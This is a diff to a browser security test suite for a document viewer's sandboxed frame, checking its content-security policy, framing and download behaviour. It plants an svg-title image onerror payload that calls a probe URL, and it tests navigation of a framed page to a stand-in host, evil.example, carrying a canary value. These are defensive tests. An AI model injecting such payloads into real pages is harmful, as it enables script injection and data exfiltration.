@@ -87,8 +87,14 @@ const tampered = (() => {
   const at = rt.start + Math.floor(rt.text.length / 2)
   return deck.slice(0, at) + (deck[at] === 'A' ? 'B' : 'A') + deck.slice(at + 1)
 })()
-const files = { deck, futureDeck, forkDeck, tampered }
+// a gate-1-GENUINE deck whose own markup carries a handler (svg <title> is foreign
+// content to a browser, raw text to the scanner): only the frame's script policy stops it
+const HANDLER_PROBE = 'bento-home-web-handler'
+const hostile = (probeUrl) => deck.replace('<body>', () => `<body><svg width="0" height="0"><title><img src="x" onerror="fetch('${probeUrl}')"></title></svg>`)
+const bom = '\ufeff' + deck
+const files = { deck, futureDeck, forkDeck, tampered, bom }
 for (const [k, v] of Object.entries(files)) fs.writeFileSync(path.join(work, `${k}.bento.html`), v)
+if (!deck.includes('<body>')) throw new Error('the 1.2.10 shell has no plain <body> tag to plant into')
 const F = (k) => path.join(work, `${k}.bento.html`)
 
 // the 1.2.99 history entry: same runtime, its own loader
@@ -121,8 +127,9 @@ async function build(name, extra) {
   for (const m of distMutants) {
     const f = path.join(out, m.file)
     const t = fs.readFileSync(f, 'utf8')
-    if (t.split(m.from).length !== 2) throw new Error(`dist mutant: "${m.from}" is not in ${m.file} exactly once`)
-    fs.writeFileSync(f, t.replace(m.from, () => m.to))
+    const n = t.split(m.from).length - 1
+    if (m.all ? n < 1 : n !== 1) throw new Error(`dist mutant: "${m.from}" occurs ${n} times in ${m.file}`)
+    fs.writeFileSync(f, m.all ? t.split(m.from).join(m.to) : t.replace(m.from, () => m.to))
     console.log(`  mutant applied to ${name}/${m.file}`)
   }
   const info = JSON.parse(fs.readFileSync(path.join(out, 'build.json'), 'utf8'))
@@ -134,6 +141,16 @@ async function build(name, extra) {
 
 section(`builds (${ENGINE})`)
 const A = await build('a', [])
+const HANDLER_URL = `${A.releaseBase}${HANDLER_PROBE}`
+fs.writeFileSync(F('hostile'), hostile(HANDLER_URL))
+{
+  const { Histories, judge } = await import(path.join(ROOT, 'home/web/src/verify.ts'))
+  const { RELEASE_KEY } = await import(path.join(ROOT, 'home/webext/src/release.js'))
+  const hs = new Histories(RELEASE_KEY, A.releaseBase, fetch)
+  await hs.take(JSON.stringify(realHistory))
+  const v = await judge(fs.readFileSync(F('hostile'), 'utf8'), hs.list())
+  ok(v.verdict === 'genuine', `fixture: the deck with a markup handler in an svg <title> is gate-1 genuine (${v.verdict}), so only the frame's policy stands in its way`)
+}
 const B = await build('b', ['--key', path.join(work, 'test-key.json'), '--history', path.join(work, 'history-test.json')])
 ok(!A.info.testKey && B.info.testKey, 'build A carries the release key, build B the throwaway test key')
 
@@ -393,19 +410,21 @@ section('[B2/T9] the frame page only boots inside the library')
   ok(top.state === 'refused' && /only runs inside bento\/home/.test(top.text), 'navigated to directly, it refuses to run (not framed)')
   const sw = await page.evaluate(async () => { try { return navigator.serviceWorker ? await navigator.serviceWorker.register('/frame.html').then(() => 'registered', (e) => e.name) : 'no API' } catch (e) { return e.name } })
   ok(sw !== 'registered', `no service worker can be registered on the frame site (${sw})`)
-  const other = await page.goto(A.frame + '/')
-  ok(other?.status() === 404, `the frame site serves one page: / answers ${other?.status()}`)
+  const other = await ctx.request.get(A.frame + '/')
+  ok(other.status() === 404, `the frame site serves one page: / answers ${other?.status()}`)
 
-  // the header lost: the same bytes served bare and FRAMED (so "not framed"
-  // cannot be what refuses): the script's own origin check must refuse
+  // the header's sandbox directive lost (its script policy kept), framed WITHOUT a
+  // sandbox attribute from the library's own origin (which frame-ancestors allows):
+  // the page has a real origin, and the script's origin check must refuse
   const bare = await ctx.newPage()
   const bareBody = fs.readFileSync(path.join(A.out, 'frame/frame.html'), 'utf8')
-  await bare.route(A.frame + '/bare.html', (r) => r.fulfill({ contentType: 'text/html', body: bareBody }))
+  const policy = A.info.framePolicy.replace(/^sandbox [^;]*; /, '')
+  await bare.route(A.frame + '/bare.html', (r) => r.fulfill({ contentType: 'text/html', headers: { 'content-security-policy': policy }, body: bareBody }))
   await bare.route(A.library + '/bare-host.html', (r) => r.fulfill({ contentType: 'text/html', body: `<!doctype html><iframe src="${A.frame}/bare.html"></iframe>` }))
   await bare.goto(A.library + '/bare-host.html')
   const bareFrame = await until(async () => { const f = bare.frames().find((x) => x.parentFrame() === bare.mainFrame()); return f && (await f.evaluate(() => document.documentElement.getAttribute('data-bento-frame'))) ? f : null }, 8000)
   const bareState = bareFrame ? await bareFrame.evaluate(() => ({ origin: self.origin, state: document.documentElement.getAttribute('data-bento-frame') })) : { origin: '?', state: 'did not load' }
-  ok(bareState.state === 'refused', `served framed but without its header (origin ${bareState.origin}), the frame script refuses to run (${bareState.state})`)
+  ok(bareState.state === 'refused', `its header without the sandbox directive, framed unsandboxed (origin ${bareState.origin}), the frame script refuses to run (${bareState.state})`)
 
   // a foreign page framing it, without a sandbox: frame-ancestors refuses
   A.s.files.set('/releases/evil.html', `<!doctype html><iframe id=f src="${A.frame}/frame.html"></iframe>`)
@@ -415,6 +434,62 @@ section('[B2/T9] the frame page only boots inside the library')
   const child = evil.frames().find((f) => f.parentFrame() === evil.mainFrame())
   const childState = child ? await child.evaluate(() => document.documentElement.getAttribute('data-bento-frame')).catch(() => 'unreachable') : 'no frame'
   ok(childState !== 'waiting', `a foreign page cannot frame it: its script never runs there (${childState})`)
+  await ctx.close()
+}
+
+// ===== [B2] the frame header lost, under the REAL library =========================================
+section('[B2] a frame page that lost its header boots nothing, even framed by the library')
+{
+  // positive control: with the header, the deck boots and its markup handler is refused by the policy
+  let ctx = await context()
+  let page = await ctx.newPage()
+  let mark = A.seen.length
+  await page.goto(A.library + '/')
+  await open(page, 'hostile')
+  const up = await booted(page)
+  await new Promise((r) => setTimeout(r, 1500))
+  ok(!!up, 'positive control: with its header, the deck with a markup handler boots')
+  ok(!A.seen.slice(mark).some((r) => r.url === HANDLER_URL), 'with its header, the markup handler does not run (the frame policy refuses it)')
+  await ctx.close()
+
+  // the same page bytes WITHOUT the header, framed by the library with its sandbox attribute
+  ctx = await context()
+  const body = fs.readFileSync(path.join(A.out, 'frame/frame.html'), 'utf8')
+  await ctx.route(A.frame + '/frame.html', (r) => r.fulfill({ contentType: 'text/html', body }))
+  page = await ctx.newPage()
+  mark = A.seen.length
+  await page.goto(A.library + '/')
+  await open(page, 'hostile')
+  const state = await until(async () => { const f = docFrame(page); return f ? f.evaluate(() => document.documentElement.getAttribute('data-bento-frame') ?? (window.bento ? 'booted' : null)) : null }, 10000)
+  await new Promise((r) => setTimeout(r, 2000))
+  const ran = await docFrame(page)?.evaluate(() => !!window.bento).catch(() => false)
+  ok(state === 'refused' && !ran, `without its header, framed by the library, the frame refuses and nothing boots (${state})`)
+  ok(!A.seen.slice(mark).some((r) => r.url === HANDLER_URL), 'without its header, the markup handler never runs')
+  await ctx.close()
+}
+
+// ===== [C4] the library's frame-src, and a byte-exact BOM ===============================================
+section("the library's frame-src keeps a document's navigation off the network; a BOM survives Download")
+{
+  const ctx = await context()
+  const evil = []
+  await ctx.route('https://evil.example/**', (r) => { evil.push(r.request().url()); r.fulfill({ contentType: 'text/html', body: '<p>evil</p>' }) })
+  const page = await ctx.newPage()
+  await page.goto(A.library + '/')
+  await open(page, 'deck')
+  const fr = await booted(page)
+  await fr?.evaluate((c) => { location.href = 'https://evil.example/?' + c }, CANARY).catch(() => {})
+  await new Promise((r) => setTimeout(r, 7000))
+  ok(!!fr && evil.length === 0, `a document navigating its frame to another site makes no request (${evil.length})`)
+
+  await page.goto(A.library + '/')
+  await open(page, 'bom')
+  const up = await booted(page)
+  const dl = page.waitForEvent('download', { timeout: 10000 }).catch(() => null)
+  await page.click('#download', { timeout: 5000 }).catch(() => {})
+  const d = await dl
+  const bytes = d ? fs.readFileSync(await d.path()) : null
+  ok(!!up && !!bytes && bytes.equals(Buffer.from(bom)), `a file starting with a byte-order mark boots and downloads byte for byte (${bytes?.length} of ${Buffer.byteLength(bom)})`)
   await ctx.close()
 }
 
